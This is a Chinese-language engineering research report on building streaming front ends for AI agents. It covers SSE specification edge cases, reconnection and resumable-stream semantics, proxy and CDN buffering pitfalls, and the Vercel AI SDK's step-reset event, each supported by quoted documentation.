# L16 调研报告 · Agent 的前端：你的主场

> 调研日期：**2026-09-15**（下文所有「访问日期」若未另注，均为此日）
> 交付物定位：一个 Web 界面 · 时长 120–150 分钟
> 硬约束：本节 verify **一次模型都不调**
>
> 置信度标记：
> - `[P]` 一手来源直接陈述（厂商官方文档 / 协议规范 / SDK 源码 / 论文原文 / 官方 changelog）
> - `[P2]` 一手来源但需要推断，或一手仓库里的非官方发言（如 issue 里的维护者分析）
> - `[S]` 二手来源 —— **本报告中 `[S]` 仅用于提供线索，不用于任何数字或结论**

---

## 0. 一句话结论

**这一节的中心论点是：agent 前端的难点不在「渲染」，在「渲染的可撤销性」。**

普通 Web 应用的渲染是一个纯函数：`state → view`。你从服务端拿到数据，渲染，完事。agent 前端不是 —— 它的输入是一条**随时可能失败、可能回退、可能换模型、可能被中间层切碎、可能被用户掐断**的字节流，而你已经把其中一部分画到屏幕上了。所以 agent 前端真正的核心数据结构不是「消息列表」，是**一个带撤销点的、可回滚的渲染缓冲区**。

三条推论，全部有一手依据，并且全部会在第 10 节变成零模型调用的确定性测试：

1. **「已渲染」不等于「已确定」。** 这不是本课程的修辞 —— Vercel AI SDK 的线协议里有一个专门的事件类型叫 `reset-step`，官方定义是 `Removes all message parts added during the current step.`（源码注释，`ai@7.0.101`）。文档进一步说它的用途正是「某一步重试了，失败那次的部分输出必须在替换输出到达之前失效」。**欠条 1 在协议层有官方对应物。** 一个只会 append 的前端，在协议层面就是不合规的。

2. **转发不是搬运，而且这件事有 CVE 级别的证据链。** WHATWG 规范自己警告 `HTTP chunking can have unexpected negative effects on the reliability of this protocol`；Anthropic 官方 TypeScript SDK 有一个修复，标题就是 `skip SSE events with empty data to prevent JSON parse crash`，原因是「边缘环境的代理和 CDN 会把 SSE chunk 切开」；Cloudflare 自己的维护者在 issue 里写明 gzip/br **不支持流式**，会把整个 body 缓冲在内存里。**中间那一层不是透明的，它会改变分帧、会改变时序、会让你的解析器崩溃。**

3. **等待期的设计必须靠可引用的数据，而这个领域的通行说法大面积是错的。** 人人引用的「0.1s / 1s / 10s」不是 Miller 1968 的数字（Miller 的是 0.1s / 2s / 15s）；进度条实验（Myers 1985）最著名的结论其实是**它没能复现**「人偏好恒定响应时间」；而逐字符慢速显示在 Tombaugh 1985 里是**降低**阅读理解的。**这一节能讲的「体感」结论比一般人以为的少得多，所以必须严格区分「可测的协议行为」和「只能肉眼验收的观感」。**

---

## 1. 反转清单（INV-1 … INV-47）

> 每条格式：**广为流传的说法** → **实际情况** → 一手来源 + 逐字引用
> 目标读者是熟练前端工程师，所以「React 怎么写」不在此列，只收「直觉会带你走错方向」的。

### 传输层 · SSE 规范细节

#### INV-1 · SSE 的事件边界是 `\n\n`

**流传说法**：SSE 用空行分隔事件，也就是 `\n\n`。
**实际**：规范允许**三种**行结束符，任意混用。所以「空行」有 9 种字节组合（CRLF+CRLF、CRLF+LF、LF+CR……）。

> "Lines must be separated by either a U+000D CARRIAGE RETURN U+000A LINE FEED (CRLF) character pair, a single U+000A LINE FEED (LF) character, or a single U+000D CARRIAGE RETURN (CR) character."
> —— WHATWG HTML Standard, *9.2.4 The event stream format*, html.spec.whatwg.org/multipage/server-sent-events.html，访问 2026-09-15 `[P]`

解析算法里也是三种并列：

> "The stream must then be parsed by reading everything line by line, with a U+000D CARRIAGE RETURN U+000A LINE FEED (CRLF) character pair, a single U+000A LINE FEED (LF) character not preceded by a U+000D CARRIAGE RETURN (CR) character, and a single U+000D CARRIAGE RETURN (CR) character not followed by a U+000A LINE FEED (LF) character being the ways in which a line can end." `[P]`

**为什么重要**：一个 `split('\n\n')` 的手写解析器在遇到 CRLF 服务端时会完全失效。这是本节 verify 的第一条确定性断言。

---

#### INV-2 · 只要字节发出去了，前端就会收到

**实际**：**流末尾缺少空行的那个事件会被直接丢弃**，规范明文规定。

> "Once the end of the file is reached, any pending data must be discarded. (If the file ends in the middle of an event, before the final empty line, the incomplete event is not dispatched.)"
> —— WHATWG HTML Standard, *event stream interpretation*，访问 2026-09-15 `[P]`

规范的示例注释又强调了一遍：

> "Note that the last still has to end with a blank line, the end of the stream is not enough to trigger the dispatch of the last event." `[P]`

另一个示例里：

> "The last block is discarded because it is not followed by a blank line." `[P]`

**为什么重要**：这是「最后一个 token 偶尔丢」这类玄学 bug 的**规范级解释**。服务端 `finally` 里忘了写最后的空行，前端就永远看不到最后一段 —— 而且不报错。

---

#### INV-3 · `data:` 后面的空格随便写

**实际**：**只忽略一个**前导空格。第二个空格是数据。

> "The following stream fires two identical events: `data:test` / `data: test`"
> "This is because the space after the colon is ignored if present."
> —— WHATWG HTML Standard, *event stream format* 示例，访问 2026-09-15 `[P]`

而多行 `data:` 是用 LF 拼接的：

> "If the field name is "data" — Append the field value to the data buffer, then append a single U+000A LINE FEED (LF) character to the data buffer." `[P]`

拼完之后最后一个 LF 要去掉：

> "3. If the data buffer's last character is a U+000A LINE FEED (LF) character, then remove the last character from the data buffer." `[P]`

规范给的例子：`data: YHOO` / `data: +2` / `data: 10` 三行 → `event.data` 等于 `"YHOO\n+2\n10"` `[P]`

**为什么重要**：如果你的 payload 本身以空格开头（比如流式文本的 token 就是 `" world"`），你必须写 `data:  world`（两个空格）或者做 JSON 编码。**直接把 token 拼进 `data: ` 会静默吃掉每个 token 的第一个空格。** 这是一个非常隐蔽的 bug：输出会变成 `Helloworld`。

---

#### INV-4 · `retry:` 设不对会报错

**实际**：**静默忽略**。非 ASCII 数字直接当没看见。

> "If the field name is "retry" — If the field value consists of only ASCII digits, then interpret the field value as an integer in base ten, and set the event stream's reconnection time to that integer. Otherwise, ignore the field."
> —— WHATWG HTML Standard，访问 2026-09-15 `[P]`

**为什么重要**：`retry: 3000ms`、`retry: 3.0`、`retry: -1` 全部静默失效，退回到实现定义的默认值：

> "A reconnection time, in milliseconds. This must initially be an implementation-defined value, probably in the region of a few seconds." `[P]`

**即「重连间隔」在你没正确设置时是个你无法预测的值。**

---

#### INV-5 · 空的 `id:` 字段等于没写

**实际**：空的 `id` 会把 last event ID **重置为空串**，从而让后续重连**不再发送** `Last-Event-ID` 头。

> "The third block fires an event with data "second event", and also has an "id" field, this time with no value, which resets the last event ID to the empty string (meaning no `Last-Event-ID` header will now be sent in the event of a reconnection being attempted)."
> —— WHATWG HTML Standard, *event stream format* 示例，访问 2026-09-15 `[P]`

而且 last event ID 是**粘性**的：

> "1. Set the last event ID string of the event source to the value of the last event ID buffer. The buffer does not get reset, so the last event ID string of the event source remains set to this value until the next time it is set by the server." `[P]`

> "If an event doesn't have an "id" field, but an earlier event did set the event source's last event ID string, then the event's `lastEventId` field will be set to the value of whatever the last seen "id" field was." `[P]`

`id` 字段的值域约束：

> "If the field value does not contain U+0000 NULL, then set the last event ID buffer to the field value. Otherwise, ignore the field." `[P]`
> "It is essentially any UTF-8 encoded string, that does not contain U+0000 NULL, U+000A LF, or U+000D CR."
> —— WHATWG HTML Standard, *9.2.3 The `Last-Event-ID` header*（引自 whatwg/html issue #7363 的说明）`[P]`

**为什么重要**：这是一个「发一个空 `id:` 来清状态」的陷阱 —— 它清的不是你以为的东西，它把断点续传能力关掉了。

---

#### INV-6 · 保活心跳是社区最佳实践

**实际**：注释行保活是**规范正文的 authoring note**，连间隔都给了，连原因都给了。

> "Legacy proxy servers are known to, in certain cases, drop HTTP connections after a short timeout. To protect against such proxy servers, authors can include a comment line (one starting with a ':' character) every 15 seconds or so."
> —— WHATWG HTML Standard, *9.2.5 Authoring notes*，访问 2026-09-15 `[P]`

注释行在解析算法里的地位：以 `:` 开头的行被忽略（规范示例：`: test stream` 所在的「第一个 block 只有一个注释,不会触发任何事件」）`[P]`

**为什么重要**：**15 秒**这个数字有出处，不用猜。而且理由是「代理会掐连接」，不是「检测客户端存活」—— 方向是反的。

---

#### INV-7 · 想让浏览器别再重连，就关掉连接

**实际**：关连接只会触发重连。规范给的**唯一**停止信号是 HTTP 204。

> "Event stream requests can be redirected using HTTP 301 and 307 redirects as with normal HTTP requests. Clients will reconnect if the connection is closed; a client can be told to stop reconnecting using the HTTP 204 No Content response code."
> —— WHATWG HTML Standard, *9.2.1 Introduction*，访问 2026-09-15 `[P]`

---

#### INV-8 · `EventSource` 断了就完了，得自己写重连

**实际**：**自动重连是规范强制的 UA 行为**，而且重连时会自动带上 `Last-Event-ID` 头。你不写重连逻辑，它也会重连。

正常结束也会重连：

> "14. Let processEventSourceEndOfBody given response res be the following step: if res is not a network error, then reestablish the connection."
> —— WHATWG HTML Standard, *9.2.2 The `EventSource` interface*，访问 2026-09-15 `[P]`

网络错误也会重连：

> "Otherwise, if res is a network error, then reestablish the connection, unless the user agent knows that to be futile, in which case the user agent may fail the connection." `[P]`

重连时自动加头：

> "When a user agent is to reestablish the connection, the user agent must run the following steps. …
> 3. If the `EventSource` object's last event ID string is not the empty string:
> 1. Let lastEventIDValue be the `EventSource` object's last event ID string, encoded as UTF-8.
> 2. Set (`Last-Event-ID`, lastEventIDValue) in request's header list." `[P]`

> "The `Last-Event-ID` HTTP request header reports an `EventSource` object's last event ID string to the server when the user agent is to reestablish the connection."
> —— WHATWG HTML Standard, *9.2.3*，访问 2026-09-15 `[P]`

重连前的等待：

> "2. Wait a delay equal to the reconnection time of the event source.
> 3. Optionally, wait some more. In particular, if the previous attempt failed, then user agents might introduce an exponential backoff delay to avoid overloading a potentially already overloaded server." `[P]`

`readyState` 的 `CONNECTING` 语义直接写着重连：

> "`CONNECTING` (numeric value 0): The connection has not yet been established, or it was closed and the user agent is reconnecting." `[P]`

只有「fail the connection」才会真正停止：

> "When a user agent is to fail the connection, the user agent must queue a task which, if the `readyState` attribute is set to a value other than `CLOSED`, sets the `readyState` attribute to `CLOSED` and fires an event named `error` at the `EventSource` object. Once the user agent has failed the connection, it does not attempt to reconnect." `[P]`

---

#### INV-9 · 用 `EventSource` + `Last-Event-ID` 就能断点续传，不会重复

**这是本节最重要的反转。实际：默认路径必然重复。**

把 INV-8 的三条事实连起来：(a) 生成正常结束时,服务端关流 → 浏览器**认为这是连接关闭,发起重连**；(b) 重连自动带 `Last-Event-ID`；(c) 如果服务端不认这个头、或者认了但从头开始发,用户就会看到内容**再来一遍**。

所以「自动重连会不会导致重复内容」的答案是：**会,而且是在完全没有网络故障的正常情况下就会。** 规范里没有任何机制让服务端说「我发完了,别再连了」—— 除了 INV-7 的 HTTP 204,而 204 是下一次请求的响应,也就是说**你必须在重连请求上下文里知道「这个 stream 已经结束了」**。

服务端必须配合的三件事,全部由上面的规范条文推出 `[P2]`：
1. 给每个事件发单调的 `id:`，否则 `Last-Event-ID` 无意义。
2. 在重连请求里读 `Last-Event-ID`，只重放该 ID 之后的事件。
3. 如果该 stream 已经结束，对重连请求返回 **204**，让浏览器停止重连。

**这就是为什么真实产品几乎都不用 `EventSource`（见 INV-10、INV-11）：它的「贴心」自动重连，在 LLM 流式场景里默认是一个重复内容生成器。**

---

#### INV-10 · `EventSource` 只是不支持 POST，其他都还好

**实际**：一手证据是构造函数的 IDL —— 它**只有一个**选项。

> "`source = new EventSource(url [, { withCredentials: true } ])`: Creates a new `EventSource` object. url is a string giving the URL that will provide the event stream. Setting `withCredentials` to true will set the credentials mode for connection requests to url to "`include`"."
> —— WHATWG HTML Standard, *9.2.2 The `EventSource` interface*，访问 2026-09-15 `[P]`

即：**没有 method、没有 headers、没有 body**。没有 `Authorization` 头，没有 `anthropic-version`，没有 `x-api-key`，没有把 messages 数组 POST 上去的办法。

另外还有一条硬限制：

> "Event streams are always decoded as UTF-8. There is no way to specify another character encoding." `[P]`

以及 `close()` 的语义（注意它是 abort fetch，不是「优雅关闭」）：

> "`source.close()`: Aborts any instances of the fetch algorithm started for this `EventSource` object, and sets the `readyState` attribute to `CLOSED`." `[P]`

---

#### INV-11 · 主流 SDK 用的是 `EventSource`

**实际**：它们用的是 **SSE 的线格式** + **fetch/POST 的传输**，不是 `EventSource` 对象。Vercel AI SDK 甚至要求一个自定义头 —— 而自定义头正是 `EventSource` 做不到的事（INV-10）。

> "The data stream protocol uses Server-Sent Events (SSE) format for improved standardization, keep-alive through ping, reconnect capabilities, and better cache handling."
> "When you provide data streams from a custom backend, you need to set the `x-vercel-ai-ui-message-stream` header to `v1`."
> —— Vercel AI SDK, *AI SDK UI: Stream Protocols*, ai-sdk.dev/docs/ai-sdk-ui/stream-protocol，访问 2026-09-15 `[P]`

流的终止标记也不是 SSE 原生概念，是借 OpenAI 的约定：

> "### Stream Termination — The stream ends with a special `[DONE]` marker. Format: Server-Sent Event with literal `[DONE]`" `[P]`

Anthropic 侧的线格式同样是 SSE，但是 POST `/v1/messages`：

> "Each server-sent event includes a named event type and associated JSON data. Each event uses an SSE event name (for example, `event: message_stop`), and includes the matching event `type` in its data."
> —— Anthropic, *Streaming messages*, platform.claude.com/docs/en/build-with-claude/streaming，访问 2026-09-15 `[P]`

**为什么重要**：这解释了「为什么 `EventSource` 教程看起来很美好，但你在真实项目里从来没用过它」。**SSE 在 agent 栈里活下来的是它的分帧格式，不是它的浏览器 API。** 于是自动重连、`Last-Event-ID`、`retry:` 这一整套语义你都**得不到**——你得自己实现（见 INV-12）。

---

#### INV-12 · 可恢复流靠 `Last-Event-ID`

**实际**：Vercel AI SDK 的官方可恢复流**完全不用** `Last-Event-ID`。它用 Redis pub/sub + 一个业务层的 `activeStreamId` + 一个数字偏移量 `resumeAt`。

> "When you enable `resume`, the `useChat` hook makes a `GET` request to `/api/chat/[id]/stream` on mount to check for and resume any active streams."
> "4. Stream recovery: The GET handler checks for an `activeStreamId` and uses `resumeExistingStream` to reconnect. If no active stream exists, it returns a 204 (No Content) response"
> —— Vercel AI SDK, *Chatbot Resume Streams*, ai-sdk.dev/docs/ai-sdk-ui/chatbot-resume-streams，访问 2026-09-15 `[P]`

依赖清单也是官方列的：

> "- Storage to track which stream belongs to each chat
> - Redis to store the UIMessage stream
> - Two API endpoints: POST to create streams, GET to resume them
> - Integration with `resumable-stream` to manage Redis storage" `[P]`

底层库的接口确认了偏移量是个数字，而非事件 ID：

> "Library for wrapping streams of strings (Like for example SSE web responses) in a way that a client can resume them after they lost a connection, or to allow a second client to follow along."
> "The library relies on a pubsub mechanism and is designed to be used with Redis."
> —— vercel/resumable-stream, github.com/vercel/resumable-stream，访问 2026-09-15 `[P]`

源码里的签名：`streamContext.resumeExistingStream(streamId, resumeAt ? parseInt(resumeAt) : undefined)`，`resumeAt` 从 query string 来，流已结束则返回 **422**。`[P]`

**为什么重要**：**「浏览器帮你续传」是个幻觉。** 真实的可恢复流是一套有状态的后端基础设施：一个 pub/sub、一个过期策略、一张「这个会话当前活跃流是哪个」的表。这件事的成本远高于前端调一个 flag。

---

#### INV-13 · 开了可恢复流，停止按钮照旧能用

**实际**：官方明说**两者不兼容**，而且给出了原因：刷新/关标签页/`stop()` 在传输层都长得一样。

> "Incompatibility with abort: Stream resumption is not compatible with abort functionality. Closing a tab or refreshing the page triggers an abort signal that will break the resumption mechanism. Do not use `resume: true` if you need abort functionality in your application"
> —— Vercel AI SDK, *Chatbot Resume Streams*，访问 2026-09-15 `[P]`

专门的排障页把这条讲成了一个设计原则：

> "When using `useChat` with `resume: true` for stream resumption, client-side aborts are treated as disconnects. Closing a tab, refreshing the page, navigating away, or calling `stop()` closes the current HTTP connection, but it should not cancel the underlying generation."
> "Stream resumption lets the client reconnect to an active stream after the original connection closes. To support that, the server needs to keep the stream producer running even when no client is currently connected."
> "This means route cleanup, page unloads, and network disconnects should be handled as resumable disconnects. Explicit user cancellation needs a separate server-side signal that cancels the active producer and clears the stored active stream reference."
> "Keep navigation separate from stop behavior. Do not call the stop endpoint from route cleanup code, page unload handlers, or component unmount cleanup. Those events are disconnects that should remain resumable."
> —— Vercel AI SDK, *Abort and resumable streams*, ai-sdk.dev/docs/troubleshooting/abort-breaks-resumable-streams，访问 2026-09-15 `[P]`

官方给的「停止按钮」正确形态是一个**独立的 HTTP 端点**：

> "The stop endpoint should:
> 1. Load the chat and read its active stream ID
> 2. Persist the latest partial assistant message if the client sends one
> 3. Cancel the work that is producing the stream
> 4. Clear the active stream reference only if it still points to the same stream" `[P]`

**为什么重要**：这是一个纯粹的「直觉走反」案例。前端工程师的本能是「组件卸载就 abort」。在 agent 前端里，**组件卸载必须什么都不做**，否则你把用户的生成杀了。「停止」是一个显式的业务动作，不是一个生命周期钩子。

---

#### INV-14 · 压缩只是让流稍微慢一点

**实际**：gzip/br **根本不支持流式**，会把整个 body 缓冲在内存里。这是 Cloudflare 自己仓库里维护者的结论。

> "- workerd will respect the `content-encoding` header in the response returned from a Worker's fetch handler.
> - if that header is `gzip` or `br` it will compress the body using an algorithm that does not support streaming and so buffers the entire content in memory before streaming it to the client.
> - if that header is `identity` or is not defined it will not compress the body and it will be streamed to the client unbuffered
> - …
> - in workerd, we only support `gzip` and `br` (Brotli) encodings, neither of which is streaming enabled."
> —— cloudflare/workers-sdk issue #8004（维护者分析），github.com/cloudflare/workers-sdk/issues/8004，访问 2026-09-15 `[P2]`

生产环境之所以「看起来正常」，是因为它默认选了一个**可流式的**算法：

> "- if the `content-encoding` header in the response is undefined then (depending upon the zone settings for the Worker) it will compress the body based on the `accept-encoding` header, but in general it will default to a streaming capable implementation of `zstd`, which is why we are seeing compressed streaming responses working in production." `[P2]`

修复 PR 把默认行为反转了：

> "When serving responses that have not defined `content-encoding` explicitly, Miniflare was attempting to infer a compression algorithm from the `accept-encoding` request header. This resulted in streamed responses being compressed with an algorithm (usually gzip) that does not support streaming; so the entire response was buffered in memory and not streamed to the client. Now Miniflare will only try to infer the `content-encoding` response from the `accept-encoding` request header if the `inferContentEncoding` option is set to `true` - the default is `false`."
> —— cloudflare/workers-sdk PR #9625，访问 2026-09-15 `[P]`

另一个 PR 里点明了 MIME type 相关的差异：

> "I actually think part of the problem is that miniflare is applying encoding in cases where cloudflare's production server doesn't. Eg, with `text/event-stream`. This isn't compressed in production (even if `accept-encoding` is sent) – whereas it is in `miniflare`."
> —— cloudflare/workers-sdk PR #5713 评论，访问 2026-09-15 `[P2]`

同一个 PR 给出的规避写法：

> "```
>     return new Response(stream, {
>       headers: {
>         'content-encoding': 'none',
>         'content-type': 'text/event-stream',
>       },
>     });
> ```" `[P]`

**为什么重要**：「本地开发流式是坏的，线上是好的」这个经典现象有确切的技术解释，而且**方向和直觉相反** —— 不是线上有额外优化，是本地多做了一次会破坏流式的压缩。

---

#### INV-15 · 发了 `X-Accel-Buffering: no` 就一定不缓冲

**实际**：nginx 可以配置**忽略**这个头。

> "Buffering can also be enabled or disabled by passing "`yes`" or "`no`" in the "X-Accel-Buffering" response header field. This capability can be disabled using the proxy_ignore_headers directive."
> —— nginx, *Module ngx_http_proxy_module*, nginx.org/en/docs/http/ngx_http_proxy_module.html，访问 2026-09-15 `[P]`

`proxy_ignore_headers` 的可忽略列表里确实有它：

> "Disables processing of certain response header fields from the proxied server. The following fields can be ignored: "X-Accel-Redirect", "X-Accel-Expires", "X-Accel-Limit-Rate" (1.1.6), "X-Accel-Buffering" (1.1.6), "X-Accel-Charset" (1.1.6), "Expires", "Cache-Control", "Set-Cookie" (0.8.44), and "Vary" (1.7.7)."
> "- "X-Accel-Buffering" enables or disables buffering of a response;" `[P]`

默认值和两种模式的语义（这是「转发不是搬运」最干净的一手引用）：

> "Syntax: `proxy_buffering on | off;` Default: `proxy_buffering on;` Context: `http`, `server`, `location`" `[P]`
> "When buffering is enabled, nginx receives a response from the proxied server as soon as possible, saving it into the buffers set by the proxy_buffer_size and proxy_buffers directives. If the whole response does not fit into memory, a part of it can be saved to a temporary file on the disk." `[P]`
> "When buffering is disabled, the response is passed to a client synchronously, immediately as it is received. nginx will not try to read the whole response from the proxied server. The maximum size of the data that nginx can receive from the server at a time is set by the proxy_buffer_size directive." `[P]`

同样的机制在 FastCGI 模块里一字不差地重复（`fastcgi_buffering` / `fastcgi_ignore_headers`）`[P]`

**为什么重要**：**`proxy_buffering` 的默认值是 `on`。** 也就是说，一个没人动过的 nginx，默认会把你的流式响应攒起来。「转发不是搬运」不是一句比喻 —— 默认配置就是不搬运。

---

#### INV-16 · CDN 最多让流变慢，不会让它出错

**实际**：CDN 会把 SSE chunk 切在**帧内**，导致出现没有 `data:` 行的事件，进而让解析器崩溃。这是 Anthropic 官方 SDK 里的一个真实修复。

> "fix(streaming): skip SSE events with empty data to prevent JSON parse crash"
> "In edge and cloud environments (Vercel Edge, Cloudflare Workers, AWS Lambda@Edge), network proxies and CDNs can split SSE chunks so that an event line …"
> —— anthropics/anthropic-sdk-typescript PR/issue #903，github.com/anthropics/anthropic-sdk-typescript/pull/903，访问 2026-09-15 `[P]`

根因分析（注意这是 SSE 解析算法的一个直接后果）：

> "`SSEDecoder.decode()` accumulates data from `data:` lines and joins them with `\n`. When an event has no `data:` line, `this.data` is `[]`, and `[].join('\n')` produces `''` (empty string). `Stream.fromSSEResponse` then blindly calls `JSON.parse('')` for known event types (`completion`, `message_start`, `content_block_delta`, etc.), which throws." `[P]`

修复：

> "Added an empty-data guard (`if (!sse.data) continue`) before `JSON.parse()` for all event types that expect JSON data" `[P]`

而 WHATWG 规范**早就警告过**这件事：

> "Authors are also cautioned that HTTP chunking can have unexpected negative effects on the reliability of this protocol, in particular if the chunking is done by a different layer unaware of the timing requirements. If this is a problem, chunking can be disabled for serving event streams."
> —— WHATWG HTML Standard, *9.2.5 Authoring notes*，访问 2026-09-15 `[P]`

规范对缓冲策略的告警也在同一页：

> "Since connections established to remote servers for such resources are expected to be long-lived, UAs should ensure that appropriate buffering is used. In particular, while line buffering with lines are defined to end with a single U+000A LINE FEED (LF) character is safe, block buffering or line buffering with different expected line endings can cause delays in event dispatch."
> —— WHATWG HTML Standard, *9.2.4*，访问 2026-09-15 `[P]`

**为什么重要**：**这是欠条 2 最硬的一手证据。** 「转发不是搬运」的具体失败模式是：字节没丢，顺序没乱，但**帧边界变了**，而一个假设「一次 read 就是一个完整事件」的解析器会直接抛异常。这也直接给出了第 10 节的一条确定性测试：随机切割点注入。

---

#### INV-17 · AWS ALB 有个缓冲开关要关掉

**实际**：**ALB 的官方文档里没有 response buffering 这个属性。** ALB 上 SSE 的真实杀手是 **60 秒默认空闲超时**。

> "`idle_timeout.timeout_seconds` — The idle timeout value, in seconds. The default is 60 seconds."
> —— AWS, *Application Load Balancers*, docs.aws.amazon.com/elasticloadbalancing/latest/application/application-load-balancers.html，访问 2026-09-15 `[P]`

> "The connection idle timeout is the period of time an existing client or target connection can remain inactive, with no data being sent or received, before the load balancer closes the connection."
> "To ensure that lengthy operations such as file uploads have time to complete, send at least 1 byte of data before each idle timeout period elapses and increase the length of the idle timeout period as needed."
> —— AWS, *Edit attributes for your Application Load Balancer*，访问 2026-09-15 `[P]`

而且 TCP keep-alive 和 HTTP/2 PING 都**不算**：

> "HTTP 408: Request timeout — The client did not send data before the idle timeout period expired. Sending a TCP keep-alive does not prevent this timeout. Send at least 1 byte of data before each idle timeout period elapses. Increase the length of the idle timeout period as needed."
> —— AWS, *Troubleshoot your Application Load Balancers*，访问 2026-09-15 `[P]`

> "do not support HTTP/2 PING frames. These do not reset the connection idle timeout."
> —— AWS, *Edit attributes for your Application Load Balancer*，访问 2026-09-15 `[P]`

还有一条与分帧直接相关的：

> "HTTP 501: Not implemented — The load balancer received a Transfer-Encoding header with an unsupported value. The supported values for Transfer-Encoding are `chunked` and `identity`. As an alternative, you can use the Content-Encoding header."
> —— AWS, *Troubleshoot your Application Load Balancers*，访问 2026-09-15 `[P]`

另外 ALB 有一个独立的客户端 keepalive 上限：默认 3600 秒（1 小时），最小 60 秒，最大 604800 秒（7 天），且**不能关闭**。`[P]`

**为什么重要**：这条同时是一条「查不到」—— 见第 9 节。**「ALB 会缓冲响应」我找不到一手来源支持。** 真正有一手依据的是 INV-6 的 15 秒注释心跳：它正好落在 ALB 60 秒超时的安全区内，而这个巧合是规范作者和 AWS 各自独立得出的。

---

#### INV-18 · 6 连接限制靠上 HTTP/2 解决

**实际**：规范在 authoring notes 里**点名**了这个问题，但它推荐的解法是 **SharedWorker**，而不是 HTTP/2。

> "Clients that support HTTP's per-server connection limitation might run into trouble when opening multiple pages from a site if each page has an `EventSource` to the same domain. Authors can avoid this using the relatively complex mechanism of using unique domain names per connection, or by allowing the user to enable or disable the `EventSource` functionality on a per-page basis, or by sharing a single `EventSource` object using a shared worker."
> —— WHATWG HTML Standard, *9.2.5 Authoring notes*，访问 2026-09-15 `[P]`

HTTP/2 下这个限制的性质确实变了 —— 变成一个协商出来的流数上限，不再是连接数：

> "HTTP/1.0 allowed only one request to be outstanding at a time on a given TCP connection. HTTP/1.1 added request pipelining, but this only partially addressed request concurrency and still suffers from application-layer head-of-line blocking. Therefore, HTTP/1.0 and HTTP/1.1 clients use multiple connections to a server to make concurrent requests."
> —— RFC 9113 (HTTP/2), §1, httpwg.org/specs/rfc9113.html，访问 2026-09-15 `[P]`

> "A single HTTP/2 connection can contain multiple concurrently open streams, with either endpoint interleaving frames from multiple streams."
> —— RFC 9113, §5 Streams and Multiplexing，访问 2026-09-15 `[P]`

> "Multiplexing of requests is achieved by having each HTTP request/response exchange associated with its own stream (Section 5). Streams are largely independent of each other, so a blocked or stalled request or response does not prevent progress on other streams." `[P]`

并发上限由 `SETTINGS_MAX_CONCURRENT_STREAMS` 协商 `[P]`。**具体数字我没有拿到 RFC 原文的逐字引用，所以不写数字。** MDN 给的「6」和「默认 100」是二手：

> "Warning: When not used over HTTP/2, SSE suffers from a limitation to the maximum number of open connections, which can be specially painful when opening various tabs as the limit is per browser and set to a very low number (6). The issue has been marked as "Won't fix" in Chrome and Firefox. … When using HTTP/2, the maximum number of simultaneous HTTP streams is negotiated between the server and the client (defaults to 100)."
> —— MDN, *EventSource*，访问 2026-09-15 `[S]`（MDN 此处自注引自 Stack Overflow，**不作为数字依据**）

Mozilla 自家 bug tracker 上有一个 2013 年的报告佐证这个限制真实存在（`[P2]`，报告人陈述而非 Mozilla 官方结论）：

> "Once you reach 6 counters (each with its own EventSource connection), you can't make any more. If you open another tab and try to access the site there, it won't connect."
> —— Bugzilla #906896, *Increase number of permitted EventSource connections*，访问 2026-09-15 `[P2]`

**为什么重要**：两点。一是规范**自己**承认这是个问题，这比任何博客都有说服力。二是**这条限制对「不用 EventSource」的实现同样适用**——因为它是 HTTP/1.1 的每域名连接限制，跟你用 `fetch` 还是 `EventSource` 无关。多标签页 agent 应用在 HTTP/1.1 上会互相饿死。

---

### 结构化流协议 · 撤回与状态机

#### INV-19 · 流式协议只能 append，撤回得自己想办法

**这是欠条 1 的直接答案。实际：Vercel AI SDK 的线协议里有专门的撤回事件。**

源码（我把版本钉死了：npm registry 上 `ai` 的 latest 在 2026-09-15 解析为 **7.0.101**）：

> ```
>  | {
>  /**
>  * Removes all message parts added during the current step.
>  */
>  type: 'reset-step';
>  }
> ```
> —— `ai@7.0.101`, `src/ui-message-stream/ui-message-chunks.ts`, cdn.jsdelivr.net/npm/ai@7.0.101/src/ui-message-stream/ui-message-chunks.ts，访问 2026-09-15 `[P]`

同一个文件里的运行时校验 schema 也有它：`z.looseObject({ type: z.literal('reset-step') })` `[P]`

文档里的语义定义更完整，而且**用途描述几乎就是欠条 1 的原文**：

> "### Reset Step Part
> Removes all message parts received since the most recent `start-step` part. If there is no step boundary, it removes all parts from the current message. This is useful when a streamed step is retried and partial output from the failed attempt must be invalidated before replacement output is sent.
> Format: Server-Sent Event with JSON object
> `data: {"type":"reset-step"}`"
> —— Vercel AI SDK, *AI SDK UI: Stream Protocols*，访问 2026-09-15 `[P]`

配套的步骤边界事件：

> "### Start Step Part — A part indicating the start of a step. `data: {"type":"start-step"}`" `[P]`
> "### Finish Step Part — A part indicating that a step (i.e., one LLM API call in the backend) has been completed. This part is necessary to correctly process multiple stitched assistant calls, e.g. when calling tools in the backend, and using steps in `useChat` at the same time." `[P]`

**为什么重要**：这条把欠条 1 从「课程的一个主张」升级成「协议的一个事件类型」。教学上的价值是：**学员的渲染缓冲区必须实现「按 step 分组 + 可整组丢弃」，而这是一个纯粹的、可以零模型调用测试的状态机。** 一个只有 `messages.push()` 的实现连协议都不合规。

---

#### INV-20 · 协议解析要严格校验，遇到未知字段就报错

**实际**：AI SDK 的 chunk schema **每一个** variant 都用 `z.looseObject`（宽松对象，容忍未知字段），这是有意的前向兼容设计。

源码里每一条都是这个形状 `[P]`：

> ```
>  z.looseObject({
>  type: z.literal('text-delta'),
>  id: z.string(),
>  delta: z.string(),
>  providerMetadata: providerMetadataSchema.optional(),
>  }),
> ```
> —— `ai@7.0.101`, `ui-message-chunks.ts`，访问 2026-09-15 `[P]`

Anthropic 把同样的要求写成了明文规定：

> "### Other events — In accordance with the versioning policy, new event types may be added, and your code should handle unknown event types gracefully."
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

**为什么重要**：这条有一个非常具体的现实后果。OpenAI 在 chunk 里加了一个 `obfuscation` 字段（见 INV-26）之后，严格校验的客户端直接挂了：

> "OpenAI gpt-5.4 streaming hangs due to unknown "obfuscation" field in SSE chunks"
> —— zed-industries/zed issue #52504，访问 2026-09-15 `[P2]`（第三方仓库的 issue 标题，作为「这件事真的发生了」的证据）

**「严格校验」在流式协议里是一个 bug，不是一个美德。**

---

#### INV-21 · 一个流对应一个模型

**实际**：Anthropic 的流**可以在中途换模型**，而且协议里有专门的事件表达这件事。

> "1. `message_start`: contains a `Message` object with empty `content`. Under the `thinking-binding-controls-2026-08-01` beta header, this `Message` object also carries the `input_transformations` array. **After a mid-stream server-side fallback, the final `message_delta` event carries the array again with the serving model's entries.**"
> —— Anthropic, *Streaming messages*，访问 2026-09-15 `[P]`

